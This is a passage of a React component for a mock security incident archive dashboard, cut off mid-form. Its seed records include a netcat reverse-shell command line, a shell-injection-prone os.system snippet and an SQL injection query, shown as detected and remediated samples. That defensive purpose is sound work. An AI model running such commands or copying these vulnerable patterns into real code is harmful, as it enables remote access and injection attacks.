import React, { useState, useEffect, useMemo } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  Archive, 
  Trash2, 
  Search, 
  Download, 
  ShieldAlert, 
  CheckCircle, 
  Clock, 
  User, 
  FileText, 
  FileJson, 
  Edit3, 
  Plus, 
  Lock, 
  RefreshCw, 
  ExternalLink,
  ChevronRight,
  Sparkles,
  AlertOctagon,
  LifeBuoy,
  X,
  Code,
  Terminal
} from 'lucide-react';
import { ArchivedThreat } from '../types';
import ExportButton from './ExportButton';

// Pre-seeded security incidents to display on first application load
const SEED_THREATS: ArchivedThreat[] = [
  {
    id: "arch-001",
    timestamp: "2026-06-07T11:01:47Z",
    category: "ebpf",
    name: "eBPF Root Escalation SUID Attempt",
    severity: "high",
    details: "Process 'backdoor_payload' triggered a setuid(0) system call. Forced sandbox termination occurred under standard enforcement constraints.",
    rawPayload: "syscall=setuid ppid=1209 pid=31411 comm=backdoor_payload args=uid=0(root) status=intercepted",
    status: "Unresolved",
    notes: "Critical. Parent PPID traces back to an unauthenticated TCP listener on port 8080. Machine isolate requested.",
    assignedOfficer: "baalbek.313@gmail.com",
    meta: {
      enclave_id: "SGX_MRENCLAVE_77a98c",
      kernel_version: "6.8.0-generic-aegis"
    }
  },
  {
    id: "arch-002",
    timestamp: "2026-06-07T10:45:10Z",
    category: "ast",
    name: "Command Execution Vulnerability in diagnostics.py",
    severity: "high",
    details: "AST parser identified dangerous os.system() command execution. Concatenation of user-supplied arguments creates high risk of Remote Code Execution (RCE).",
    rawPayload: "def backup_system(user_path):\n    # VULNERABLE DIRECT EXECUTION\n    os.system('tar -czf site_bak.tar.gz ' + user_path)",
    status: "Triaged",
    notes: "Assigned for immediate refactoring to use list-based subprocess.run with shell=False.",
    assignedOfficer: "baalbek.313@gmail.com",
    meta: {
      heuristic_type: "os.system_concatenation",
      vulnerability_index: "CWE-78"
    }
  },
  {
    id: "arch-003",
    timestamp: "2026-06-07T09:12:00Z",
    category: "ebpf",
    name: "Netcat Reverse Shell Spawned",
    severity: "high",
    details: "Telemetry hook intercepted Netcat launching an outbound TCP session on port 4444.",
    rawPayload: "syscall=execve pid=14209 ppid=14011 comm=nc args=-e /bin/sh 192.168.1.100 4444 status=vetted",
    status: "Remediated",
    notes: "Outbound socket intercepted. Port 4444 blocked globally inside iptables rules. Docker container recycled.",
    assignedOfficer: "baalbek.313@gmail.com",
    meta: {
      severity_score: 9.8,
      mitigation: "iptables drop rule added"
    }
  },
  {
    id: "arch-004",
    timestamp: "2026-06-07T08:30:15Z",
    category: "ast",
    name: "SQL Injection in auth_verifier.py",
    severity: "medium",
    details: "Un-parameterized database query executed. Dynamic local raw input concatenated directly inside SQLite runner query.",
    rawPayload: "conn.execute(f\"SELECT * FROM secret_hashes WHERE user_id = '{user_id}'\")",
    status: "False Positive",
    notes: "Code path confirmed to be inside offline local dev sandbox utility that handles non-client pre-compiled database tables. False Alarm flagged.",
    assignedOfficer: "baalbek.313@gmail.com",
    meta: {
      vulnerability_index: "CWE-89",
      target_db: "sqlite3"
    }
  }
];

const CATEGORY_OPTIONS = [
  { id: 'ebpf', label: 'eBPF Telemetry' },
  { id: 'ast', label: 'AST Static Scan' }
];

const SEVERITY_OPTIONS = [
  { id: 'high', label: 'Critical' },
  { id: 'medium', label: 'Medium' },
  { id: 'low', label: 'Low' }
];

interface ThreatArchiveProps {
  triggerToast?: (msg: string) => void;
}

export default function ThreatArchive({ triggerToast }: ThreatArchiveProps = {}) {
  const [threats, setThreats] = useState<ArchivedThreat[]>([]);
  const [selectedThreatId, setSelectedThreatId] = useState<string | null>(null);
  
  // Filtering and Searching parameters
  const [searchQuery, setSearchQuery] = useState('');
  const [categoryFilters, setCategoryFilters] = useState<string[]>(['ebpf', 'ast']);
  const [severityFilters, setSeverityFilters] = useState<string[]>(['low', 'medium', 'high']);
  const [statusFilter, setStatusFilter] = useState<string>('ALL');

  // Multi-select dropdown open states
  const [isCategoryDropdownOpen, setIsCategoryDropdownOpen] = useState(false);
  const [isSeverityDropdownOpen, setIsSeverityDropdownOpen] = useState(false);

  // Label helpers for multi-select selectors
  const categoryLabel = useMemo(() => {
    if (categoryFilters.length === CATEGORY_OPTIONS.length) {
      return "All Sources";
    }
    if (categoryFilters.length === 0) {
      return "None Selected";
    }
    return categoryFilters.map(c => CATEGORY_OPTIONS.find(opt => opt.id === c)?.label).join(', ');
  }, [categoryFilters]);

  const severityLabel = useMemo(() => {
    if (severityFilters.length === SEVERITY_OPTIONS.length) {
      return "All Severities";
    }
    if (severityFilters.length === 0) {
      return "None Selected";
    }
    return severityFilters.map(s => SEVERITY_OPTIONS.find(opt => opt.id === s)?.label).join(', ');
  }, [severityFilters]);

  // Input states for registering a new manual mock incident entry
  const [isAddingNew, setIsAddingNew] = useState(false);
  const [newTitle, setNewTitle] = useState('');
  const [newCategory, setNewCategory] = useState<'ebpf' | 'ast'>('ebpf');
  const [newSeverity, setNewSeverity] = useState<'low' | 'medium' | 'high'>('high');
  const [newDetails, setNewDetails] = useState('');
  const [newRawPayload, setNewRawPayload] = useState('');

  // Editing state for notes
  const [editingNotes, setEditingNotes] = useState<string>('');
  const [isEditingNotes, setIsEditingNotes] = useState(false);

  // Syncing with localStorage
  useEffect(() => {
    const saved = localStorage.getItem('aegis_threat_archive');
    if (saved) {
      try {
        setThreats(JSON.parse(saved));
      } catch (e) {
        setThreats(SEED_THREATS);
      }
    } else {
      localStorage.setItem('aegis_threat_archive', JSON.stringify(SEED_THREATS));
      setThreats(SEED_THREATS);
    }
  }, []);

  const saveToStorage = (updatedList: ArchivedThreat[]) => {
    setThreats(updatedList);
    localStorage.setItem('aegis_threat_archive', JSON.stringify(updatedList));
  };

  // Automatically update the notes fields
  const activeThreat = useMemo(() => {
    return threats.find(t => t.id === selectedThreatId) || null;
  }, [threats, selectedThreatId]);

  useEffect(() => {
    if (activeThreat) {
      setEditingNotes(activeThreat.notes || '');
      setIsEditingNotes(false);
    }
  }, [activeThreat]);

  // Handle Note Save Action
  const handleSaveNotes = () => {
    if (!selectedThreatId) return;
    const updated = threats.map(t => {
      if (t.id === selectedThreatId) {
        return { ...t, notes: editingNotes };
      }
      return t;
    });
    saveToStorage(updated);
    setIsEditingNotes(false);
  };

  // Handle Threat Status updates
  const handleUpdateStatus = (newStatus: ArchivedThreat['status']) => {
    if (!selectedThreatId) return;
    const updated = threats.map(t => {
      if (t.id === selectedThreatId) {
        return { ...t, status: newStatus };
      }
      return t;
    });
    saveToStorage(updated);
  };

  // Handle Threat Deletion
  const handleDeleteThreat = (id: string) => {
    const updated = threats.filter(t => t.id !== id);
    saveToStorage(updated);
    if (selectedThreatId === id) {
      setSelectedThreatId(null);
    }
  };

  // Handle Export to Forensic database
  const handleExportArchiveJSON = () => {
    const payload = {
      manifest: {
        tool: "Aegis Threat Archive Vault",
        compiled_posture: "LOCAL_PERSISTED_DATABASE",
        checksum_id: "SHA256_LOCAL_AEGIS_DB_V2",
        exported_timestamp_utc: new Date().toISOString(),
        total_archived_records_count: threats.length
      },
      records: threats
    };

    const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(payload, null, 2));
    const downloadAnchor = document.createElement('a');
    downloadAnchor.setAttribute("href", dataStr);
    downloadAnchor.setAttribute("download", `aegis_persisted_threat_vault_${Date.now()}.json`);
    document.body.appendChild(downloadAnchor);
    downloadAnchor.click();
    downloadAnchor.remove();
  };

  // Handle manual incident creation
  const handleCreateNewThreat = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newTitle || !newDetails) return;

    const newThreat: ArchivedThreat = {
      id: `man-${Date.now()}`,
      timestamp: new Date().toISOString(),
      category: newCategory,
      name: newTitle,
      severity: newSeverity,
      details: newDetails,
      rawPayload: newRawPayload || "No payload debug stream registered.",
      status: "Unresolved",
      notes: "Simulated local report filing.",
      assignedOfficer: "baalbek.313@gmail.com",
      meta: {
        origin: "Manual Forensic Log Filing",
        enclave_id: "SGX_MRENCLAVE_77a98c"
      }
    };

    const updated = [newThreat, ...threats];
    saveToStorage(updated);
    setSelectedThreatId(newThreat.id);
    setIsAddingNew(false);
    
    // Clear form inputs
    setNewTitle('');
    setNewDetails('');
    setNewRawPayload('');
  };

  // Wipe archive clear helper
  const handleClearEverything = () => {
    if (confirm("Are you sure you want to permanently empty the local Threat Archive storage? This cannot be undone.")) {
      saveToStorage([]);
      setSelectedThreatId(null);
    }
  };

  // Reset to seeds
  const handleResetToSeeds = () => {
    saveToStorage(SEED_THREATS);
    setSelectedThreatId(null);
  };

  // Process search filters
  const filteredThreats = useMemo(() => {
    return threats.filter(t => {
      const matchesSearch = 
        t.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
        t.details.toLowerCase().includes(searchQuery.toLowerCase()) ||
        t.rawPayload.toLowerCase().includes(searchQuery.toLowerCase()) ||
        (t.notes && t.notes.toLowerCase().includes(searchQuery.toLowerCase()));

      const matchesCategory = categoryFilters.includes(t.category);
      const matchesSeverity = severityFilters.includes(t.severity);
      const matchesStatus = statusFilter === 'ALL' || t.status === statusFilter;

      return matchesSearch && matchesCategory && matchesSeverity && matchesStatus;
    });
  }, [threats, searchQuery, categoryFilters, severityFilters, statusFilter]);

  const getSeverityLabel = (sev: string) => {
    switch (sev) {
      case 'high':
        return <span className="text-rose-400 font-bold tracking-wide text-[8.5px] bg-rose-950/20 px-1.5 py-0.5 border border-rose-900/30 rounded uppercase">CRITICAL</span>;
      case 'medium':
        return <span className="text-amber-300 font-bold tracking-wide text-[8.5px] bg-amber-955/20 px-1.5 py-0.5 border border-amber-900/30 rounded uppercase">MEDIUM</span>;
      default:
        return <span className="text-blue-400 font-bold tracking-wide text-[8.5px] bg-blue-950/20 px-1.5 py-0.5 border border-blue-900/30 rounded uppercase">LOW</span>;
    }
  };

  const getStatusLabel = (st: ArchivedThreat['status']) => {
    switch (st) {
      case 'Unresolved':
        return <span className="text-red-400 bg-red-950/15 px-2 py-0.5 rounded border border-red-900/40 text-[9px] uppercase font-bold tracking-wider">UNRESOLVED</span>;
      case 'Triaged':
        return <span className="text-[#00f0ff] bg-[#00f0ff]/10 px-2 py-0.5 rounded border border-[#00f0ff]/30 text-[9px] uppercase font-bold tracking-wider">TRIAGED</span>;
      case 'Remediated':
        return <span className="text-emerald-400 bg-emerald-950/15 px-2 py-0.5 rounded border border-emerald-900/45 text-[9px] uppercase font-bold tracking-wider">REMEDIATED</span>;
      case 'False Positive':
        return <span className="text-zinc-400 bg-zinc-900/20 px-2 py-0.5 rounded border border-zinc-800 text-[9px] uppercase font-bold tracking-wider">FALSE POSITIVE</span>;
    }
  };

  return (
    <div className="bg-[#0A0A0C]/90 border border-white/5 rounded-lg shadow-[0_4px_30px_rgba(0,0,0,0.4)] overflow-hidden font-mono text-[11px] grid grid-cols-1">
      {/* Module Title bar Header */}
      <div className="border-b border-white/5 bg-gradient-to-r from-black/80 to-[#101014] px-5 py-4 flex flex-col md:flex-row md:items-center justify-between gap-3 select-none">
        <div className="flex items-center gap-2.5">
          <div className="p-2 border border-[#00f0ff]/35 bg-[#00f0ff]/5 text-[#00f0ff] rounded-md">
            <Archive size={15} />
          </div>
          <div>
            <span className="text-[9px] tracking-widest text-[#00f0ff]/80 uppercase font-bold flex items-center gap-1">
              SECURE LOG ARCHIVE <Lock size={9} />
            </span>
            <h3 className="text-sm font-serif font-light text-zinc-100 flex items-center gap-1.5 leading-tight">
              Durable Offline Threat Vault
            </h3>
          </div>
        </div>

        {/* Global actions */}
        <div className="flex items-center gap-2">
          <button
            onClick={() => setIsAddingNew(true)}
            className="px-3 py-1.5 bg-[#00f0ff]/15 hover:bg-[#00f0ff]/25 border border-[#00f0ff]/30 text-[#00f0ff] hover:text-white rounded font-mono text-[9px] font-bold tracking-wider uppercase transition-all flex items-center gap-1 cursor-pointer"
          >
            <Plus size={11} /> File Manual Alert
          </button>
          <ExportButton
            id="btn-export-threat-archive"
            label="Export Vault"
            filenamePrefix="aegis_threat_vault_archive"
            jsonData={{
              archive_database: "AEGIS Threat Vault Storage",
              total_records: threats.length,
              filtered_records_count: filteredThreats.length,
              threats: filteredThreats,
              timestamp: new Date().toISOString()
            }}
            csvData={filteredThreats.map(t => ({
              id: t.id,
              timestamp: t.timestamp,
              category: t.category,
              name: t.name,
              severity: t.severity,
              status: t.status,
              assigned_officer: t.assignedOfficer,
              details: t.details,
              notes: t.notes
            }))}
            textReport={`=== AEGIS THREAT VAULT ARCHIVE REPORT ===\nDate: ${new Date().toISOString()}\nTotal Indexed Incidents: ${filteredThreats.length}\n\n${filteredThreats.map((t, i) => `[${i+1}] ${t.id} - ${t.name} (${t.severity.toUpperCase()})\nModule: ${t.category.toUpperCase()} | Status: ${t.status}\nAssigned: ${t.assignedOfficer}\nTimestamp: ${t.timestamp}\nDetails: ${t.details}\nNotes: ${t.notes}\nPayload:\n${t.rawPayload}\n`).join('\n----------------------------------------\n')}`}
            triggerToast={triggerToast}
            size="xs"
          />
        </div>
      </div>

      {/* Control Filters panel */}
      <div className="bg-black/20 border-b border-white/5 p-4 space-y-3.5 select-none">
        <div className="grid grid-cols-1 md:grid-cols-12 gap-3.5">
          {/* Text Search input */}
          <div className="md:col-span-4 relative">
            <span className="absolute left-2.5 top-2.5 text-[#00f0ff]">
              <Search size={11} />
            </span>
            <input
              type="text"
              placeholder="Search details, note signatures, payloads..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="w-full bg-black/70 border border-white/5 hover:border-white/10 focus:border-[#00f0ff]/50 rounded px-8 py-2 text-zinc-300 placeholder-zinc-650 focus:outline-none font-mono text-[10px] transition-all"
            />
          </div>

          {/* Category Dropdown/Selector buttons */}
          <div className="md:col-span-8 grid grid-cols-1 md:grid-cols-3 gap-3.5">
            {/* Category Filter Multi-Select */}
            <div className="relative flex flex-col justify-center bg-[#07070A] border border-white/5 p-1 rounded min-h-[32px]">
              {isCategoryDropdownOpen && (
                <div 
                  className="fixed inset-0 z-40 cursor-default" 
                  onClick={() => setIsCategoryDropdownOpen(false)} 
                />
              )}
              <div 
                onClick={() => {
                  setIsCategoryDropdownOpen(!isCategoryDropdownOpen);
                  setIsSeverityDropdownOpen(false);
                }}
                className="flex items-center justify-between gap-1.5 px-1.5 py-0.5 cursor-pointer select-none text-zinc-200 text-[10px] font-mono"
              >
                <div className="flex items-center gap-1.5 overflow-hidden truncate">
                  <span className="text-[8px] text-white/35 uppercase min-w-fit font-bold">MODULES:</span>
                  <span className="truncate text-[#00f0ff] font-semibold">{categoryLabel}</span>
                </div>
                <ChevronRight 
                  size={10} 
                  className={`text-[#00f0ff] transition-transform duration-200 shrink-0 ${isCategoryDropdownOpen ? 'rotate-90' : ''}`} 
                />
              </div>

              <AnimatePresence>
                {isCategoryDropdownOpen && (
                  <motion.div
                    initial={{ opacity: 0, y: 4 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0, y: 4 }}
                    transition={{ duration: 0.15 }}
                    className="absolute top-full left-0 right-0 z-50 mt-1.5 bg-[#0C0C10] border border-white/10 rounded shadow-[0_10px_25px_rgba(0,0,0,0.8)] p-2.5 space-y-2 font-mono text-[10px]"
                  >
                    <div className="flex items-center justify-between border-b border-white/5 pb-1.5 mb-1.5 text-[9px] text-white/40">
                      <span>SELECT FILTER SOURCES</span>
                      <button
                        type="button"
                        onClick={(e) => {
                          e.stopPropagation();
                          if (categoryFilters.length === CATEGORY_OPTIONS.length) {
                            setCategoryFilters([]);
                          } else {
                            setCategoryFilters(CATEGORY_OPTIONS.map(o => o.id));
                          }
                        }}
                        className="text-[#00f0ff] hover:underline font-bold uppercase"
                      >
                        {categoryFilters.length === CATEGORY_OPTIONS.length ? "Clear All" : "Select All"}
                      </button>
                    </div>
                    <div className="space-y-1.5 max-h-[140px] overflow-y-auto">
                      {CATEGORY_OPTIONS.map((opt) => {
                        const isChecked = categoryFilters.includes(opt.id);
                        return (
                          <label
                            key={opt.id}
                            className="flex items-center gap-2 px-1.5 py-1 hover:bg-white/5 rounded cursor-pointer text-zinc-300 transition-colors"
                            onClick={(e) => e.stopPropagation()}
                          >
                            <input
                              type="checkbox"
                              checked={isChecked}
                              onChange={() => {
                                if (isChecked) {
                                  setCategoryFilters(categoryFilters.filter(c => c !== opt.id));
                                } else {
                                  setCategoryFilters([...categoryFilters, opt.id]);
                                }
                              }}
                              className="accent-[#00f0ff] h-3 w-3 rounded border-white/10 bg-black cursor-pointer"
                            />
                            <span>{opt.label}</span>
                          </label>
                        );
                      })}
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>

            {/* Severity Filter Multi-Select */}
            <div className="relative flex flex-col justify-center bg-[#07070A] border border-white/5 p-1 rounded min-h-[32px]">
              {isSeverityDropdownOpen && (
                <div 
                  className="fixed inset-0 z-40 cursor-default" 
                  onClick={() => setIsSeverityDropdownOpen(false)} 
                />
              )}
              <div 
                onClick={() => {
                  setIsSeverityDropdownOpen(!isSeverityDropdownOpen);
                  setIsCategoryDropdownOpen(false);
                }}
                className="flex items-center justify-between gap-1.5 px-1.5 py-0.5 cursor-pointer select-none text-zinc-200 text-[10px] font-mono"
              >
                <div className="flex items-center gap-1.5 overflow-hidden truncate">
                  <span className="text-[8px] text-white/35 uppercase min-w-fit font-bold">SEVERITIES:</span>
                  <span className="truncate text-[#00f0ff] font-semibold">{severityLabel}</span>
                </div>
                <ChevronRight 
                  size={10} 
                  className={`text-[#00f0ff] transition-transform duration-200 shrink-0 ${isSeverityDropdownOpen ? 'rotate-90' : ''}`} 
                />
              </div>

              <AnimatePresence>
                {isSeverityDropdownOpen && (
                  <motion.div
                    initial={{ opacity: 0, y: 4 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0, y: 4 }}
                    transition={{ duration: 0.15 }}
                    className="absolute top-full left-0 right-0 z-50 mt-1.5 bg-[#0C0C10] border border-white/10 rounded shadow-[0_10px_25px_rgba(0,0,0,0.8)] p-2.5 space-y-2 font-mono text-[10px]"
                  >
                    <div className="flex items-center justify-between border-b border-white/5 pb-1.5 mb-1.5 text-[9px] text-white/40">
                      <span>SELECT FILTER SEVERITIES</span>
                      <button
                        type="button"
                        onClick={(e) => {
                          e.stopPropagation();
                          if (severityFilters.length === SEVERITY_OPTIONS.length) {
                            setSeverityFilters([]);
                          } else {
                            setSeverityFilters(SEVERITY_OPTIONS.map(o => o.id));
                          }
                        }}
                        className="text-[#00f0ff] hover:underline font-bold uppercase"
                      >
                        {severityFilters.length === SEVERITY_OPTIONS.length ? "Clear All" : "Select All"}
                      </button>
                    </div>
                    <div className="space-y-1.5 max-h-[140px] overflow-y-auto">
                      {SEVERITY_OPTIONS.map((opt) => {
                        const isChecked = severityFilters.includes(opt.id);
                        return (
                          <label
                            key={opt.id}
                            className="flex items-center gap-2 px-1.5 py-1 hover:bg-white/5 rounded cursor-pointer text-zinc-300 transition-colors"
                            onClick={(e) => e.stopPropagation()}
                          >
                            <input
                              type="checkbox"
                              checked={isChecked}
                              onChange={() => {
                                if (isChecked) {
                                  setSeverityFilters(severityFilters.filter(s => s !== opt.id));
                                } else {
                                  setSeverityFilters([...severityFilters, opt.id]);
                                }
                              }}
                              className="accent-[#00f0ff] h-3 w-3 rounded border-white/10 bg-black cursor-pointer"
                            />
                            <span>{opt.label}</span>
                          </label>
                        );
                      })}
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>
            </div>

            <div className="flex items-center gap-1.5 bg-[#07070A] border border-white/5 p-1 rounded min-h-[32px]">
              <span className="text-[8px] text-white/35 uppercase min-w-fit pl-1 font-bold">STATUS:</span>
              <select
                value={statusFilter}
                onChange={(e) => setStatusFilter(e.target.value)}
                className="bg-transparent text-zinc-200 text-[10px] font-mono focus:outline-none cursor-pointer flex-1 py-0.5 px-1"
              >
                <option value="ALL" className="bg-[#0A0A0C]">All Statuses</option>
                <option value="Unresolved" className="bg-[#0A0A0C]">Unresolved</option>
                <option value="Triaged" className="bg-[#0A0A0C]">Triaged</option>
                <option value="Remediated" className="bg-[#0A0A0C]">Remediated</option>
                <option value="False Positive" className="bg-[#0A0A0C]">False Positive</option>
              </select>
            </div>
          </div>
        </div>
      </div>

      {/* Main Split Layout: Archive log lines index vs Detail metadata sidebar */}
      <div className="grid grid-cols-1 lg:grid-cols-12 min-h-[480px]">
        {/* Left Side: Incidents ledger */}
        <div className="lg:col-span-7 bg-[#050507] border-r border-white/5 p-4 space-y-3 max-h-[500px] overflow-y-auto">
          <div className="flex items-center justify-between text-zinc-550 text-[9px] border-b border-dashed border-zinc-900 pb-1.5 mb-2 select-none">
            <span>SHOWING {filteredThreats.length} OF {threats.length} DURABLE THREAT LOGS</span>
            <div className="space-x-1.5">
              <button 
                onClick={handleResetToSeeds}
                className="hover:text-[#00f0ff] transition-all cursor-pointer font-bold uppercase"
              >
                Reset Default specimens
              </button>
              <span>|</span>
              <button 
                onClick={handleClearEverything}
                className="hover:text-rose-400 transition-all cursor-pointer font-bold uppercase"
              >
                Flush Clear Database
              </button>
            </div>
          </div>

          {filteredThreats.length === 0 ? (
            <div className="py-24 text-center text-zinc-650 font-mono italic">
              &lt;No preserved security alerts reported under selected filters&gt;
            </div>
          ) : (
            <div className="space-y-2">
              <AnimatePresence initial={false}>
                {filteredThreats.map((threat) => {
                  const isSelected = selectedThreatId === threat.id;
                  return (
                    <motion.div
                      key={threat.id}
                      initial={{ opacity: 0, y: 3 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0, y: -3 }}
                      onClick={() => setSelectedThreatId(threat.id)}
                      className={`p-3.5 border rounded-lg cursor-pointer transition-all select-none group relative ${
                        isSelected 
                          ? 'bg-[#101014] border-[#00f0ff]/50 shadow-[0_0_15px_rgba(0,240,255,0.06)] border-l-2 border-l-[#00f0ff]' 
                          : 'bg-black/40 border-white/5 hover:border-white/10 hover:bg-black/60'
                      }`}
                    >
                      <div className="flex items-start justify-between gap-2.5">
                        <div className="space-y-1">
                          <div className="flex items-center gap-2">
                            <span className={`text-[8.5px] uppercase font-bold px-1.5 rounded tracking-wide ${
                              threat.category === 'ebpf' 
                                ? 'bg-fuchsia-905/20 text-fuchsia-400 border border-fuchsia-900/30' 
                                : 'bg-sky-950/20 text-sky-400 border border-sky-900/30'
                            }`}>
                              {threat.category}
                            </span>
                            {getSeverityLabel(threat.severity)}
                            {getStatusLabel(threat.status)}
                          </div>
                          
                          <h4 className={`text-xs font-semibold leading-relaxed mt-1 ${isSelected ? 'text-zinc-100' : 'text-zinc-300'}`}>
                            {threat.name}
                          </h4>
                          <p className="text-[10px] text-zinc-550 leading-relaxed font-mono truncate max-w-md">
                            {threat.details}
                          </p>
                        </div>
                        
                        <div className="flex flex-col items-end shrink-0 select-none space-y-1.5">
                          <span className="text-[9px] text-zinc-550 italic font-mono">
                            {threat.timestamp.split('T')[1].substring(0, 8)}
                          </span>
                          <button
                            onClick={(e) => {
                              e.stopPropagation();
                              handleDeleteThreat(threat.id);
                            }}
                            className="p-1 text-zinc-600 hover:text-rose-400 opacity-0 group-hover:opacity-100 transition-all rounded hover:bg-white/5 cursor-pointer"
                            title="Delete this record from durable local storage"
                          >
                            <Trash2 size={11} />
                          </button>
                        </div>
                      </div>
                    </motion.div>
                  );
                })}
              </AnimatePresence>
            </div>
          )}
        </div>

        {/* Right Side: Log Meta Explorer Deep-Dive pane */}
        <div className="lg:col-span-5 bg-black/25 flex flex-col p-5">
          {activeThreat ? (
            <div className="space-y-4 flex-1 flex flex-col justify-between">
              
              <div className="space-y-4">
                {/* Event Name */}
                <div className="border-b border-white/5 pb-3">
                  <div className="text-[8px] font-bold tracking-wider text-white/30 uppercase flex items-center gap-1 select-none">
                    <Clock size={10} /> Preserved incident ID: <strong className="text-[#00f0ff] font-semibold">{activeThreat.id}</strong>
                  </div>
                  <h4 className="text-sm font-serif font-light text-zinc-100 mt-1 lines-clamp-2 leading-relaxed">
                    {activeThreat.name}
                  </h4>
                  <p className="text-[9px] text-zinc-550 font-mono mt-1 select-all">
                    Time Filed: {new Date(activeThreat.timestamp).toLocaleString()}
                  </p>
                </div>

                {/* Main description section */}
                <div className="space-y-1">
                  <div className="text-[8.5px] text-zinc-550 font-bold uppercase tracking-wider select-none">Incident Narrative Details</div>
                  <p className="text-zinc-300 text-[11.5px] leading-relaxed font-sans font-light select-all">
                    {activeThreat.details}
                  </p>
                </div>

                {/* Raw Execution Payload box */}
                <div className="space-y-1.5">
                  <div className="text-[8.5px] text-zinc-550 font-bold uppercase tracking-wider flex items-center justify-between select-none">
                    <span>Raw Execution Context / Syscall Args</span>
                    <span className="text-[8px] text-rose-400 uppercase tracking-widest font-bold">Unsanitized Payload</span>
                  </div>
                  <div className="bg-black border border-white/5 rounded p-3 text-rose-300 leading-normal text-[10.5px] max-h-24 overflow-y-auto whitespace-pre overflow-x-auto select-all selection:bg-rose-950 font-mono">
                    <code>{activeThreat.rawPayload}</code>
                  </div>
                </div>

                {/* Status modifier dropdown option */}
                <div className="grid grid-cols-2 gap-3.5 bg-[#0B0B0E] border border-white/5 rounded p-3 select-none">
                  <div>
                    <span className="block text-[8px] text-white/35 uppercase">Assigned Officer</span>
                    <span className="text-zinc-300 block mt-0.5 text-[10.5px] select-all flex items-center gap-1">
                      <User size={10} className="text-[#00f0ff]" /> {activeThreat.assignedOfficer || "Unassigned"}
                    </span>
                  </div>
                  <div>
                    <span className="block text-[8px] text-white/35 uppercase mb-1">State Classification</span>
                    <select
                      value={activeThreat.status}
                      onChange={(e) => handleUpdateStatus(e.target.value as ArchivedThreat['status'])}
                      className="bg-black border border-white/5 hover:border-white/10 rounded px-2 py-1 text-[10px] text-[#00f0ff] font-mono focus:outline-none cursor-pointer w-full font-bold"
                    >
                      <option value="Unresolved">Unresolved</option>
                      <option value="Triaged">Triaged</option>
                      <option value="Remediated">Remediated</option>
                      <option value="False Positive">False Positive</option>
                    </select>
                  </div>
                </div>

                {/* Persistent Notes section */}
                <div className="space-y-2 border-t border-white/5 pt-3">
                  <div className="flex items-center justify-between select-none">
                    <span className="text-[8.5px] text-zinc-550 font-bold uppercase tracking-wider flex items-center gap-1">
                      <FileText size={11} className="text-[#00f0ff]" /> Researcher Annotations & Notes
                    </span>
                    {!isEditingNotes ? (
                      <button
                        onClick={() => setIsEditingNotes(true)}
                        className="text-[9px] text-[#00f0ff] hover:text-white transition-all cursor-pointer font-bold uppercase flex items-center gap-0.5"
                      >
                        <Edit3 size={10} /> Edit Notes
                      </button>
                    ) : (
                      <div className="space-x-2">
                        <button
                          onClick={handleSaveNotes}
                          className="text-[9px] text-emerald-400 hover:text-emerald-300 font-bold uppercase cursor-pointer"
                        >
                          Save
                        </button>
                        <button
                          onClick={() => {
                            setEditingNotes(activeThreat.notes || '');
                            setIsEditingNotes(false);
                          }}
                          className="text-[9px] text-zinc-400 hover:text-zinc-300 font-bold uppercase cursor-pointer"
                        >
                          Cancel
                        </button>
                      </div>
                    )}
                  </div>

                  {!isEditingNotes ? (
                    <div className="bg-black/45 border border-white/5 p-3 rounded text-zinc-400 min-h-16 leading-relaxed text-[10px] select-all italic whitespace-pre-wrap font-mono">
                      {activeThreat.notes ? activeThreat.notes : "No annotations logged yet for this incident file. Add critical response notes above."}
                    </div>
                  ) : (
                    <textarea
                      value={editingNotes}
                      onChange={(e) => setEditingNotes(e.target.value)}
                      placeholder="Input custom forensic assessments or remediation comments..."
                      className="w-full bg-black border border-white/10 focus:border-[#00f0ff]/50 rounded p-2 text-zinc-300 min-h-20 focus:outline-none font-mono text-[10px] transition-all"
                    />
                  )}
                </div>

              </div>

              {/* Sandbox Metadata Enclave stamps info */}
              <div className="border-t border-white/5 pt-3.5 mt-3 select-none">
                <div className="flex items-center gap-1.5 text-zinc-600 text-[8.5px] font-mono leading-relaxed">
                  <Sparkles size={11} className="text-[#00f0ff]" /> SGX Enclave Secure Seal: VALIDATING_SEAL_SUCCESS_STAMP
                </div>
              </div>

            </div>
          ) : (
            <div className="flex-1 flex flex-col justify-center items-center text-center p-8 select-none text-zinc-650 font-mono italic">
              <ShieldAlert size={28} className="text-zinc-700 mb-2.5" />
              <span>Select any archived incident spec line from the ledger index to inspect deeper forensic metadata and add researchers notes.</span>
            </div>
          )}
        </div>
      </div>

      {/* Slide-over Overlay form for Adding a Manual Incident Alert */}
      <AnimatePresence>
        {isAddingNew && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setIsAddingNew(false)}
              className="absolute inset-0 bg-black/85 backdrop-blur-sm cursor-pointer"
            />
            
            <motion.div 
              initial={{ scale: 0.95, opacity: 0, y: 15 }}
              animate={{ scale: 1, opacity: 1, y: 0 }}
              exit={{ scale: 0.95, opacity: 0, y: 15 }}
              className="relative w-full max-w-xl bg-[#09090C] border border-white/10 rounded-lg shadow-2xl p-6 space-y-4 z-10 font-mono text-[11px]"
            >
              <div className="flex items-center justify-between border-b border-white/5 pb-2.5">
                <h4 className="text-xs font-serif font-light text-zinc-100 flex items-center gap-1.5 leading-tight select-none">
                  <Plus size={13} className="text-[#00f0ff]" /> File Manual Threat Incident Log
                </h4>
                <button
                  onClick={() => setIsAddingNew(false)}
                  className="p-1 rounded text-zinc-500 hover:text-white hover:bg-white/5 cursor-pointer"
                >
                  <X size={13} />
                </button>
              </div>

              <form onSubmit={handleCreateNewThreat} className="space-y-3.5">
                {/* Title */}
                <div className="space-y-1">
                  <label className="text-[8.5px] text-zinc-500 uppercase tracking-wider font-bold">Threat Title</label>
                  <input
                    type="text"
                    required
                    placeholder="e.g. Reverse socket pipe execution flagged"
                    value={newTitle}
                    onChange={(e) => setNewTitle(e.target.value)}
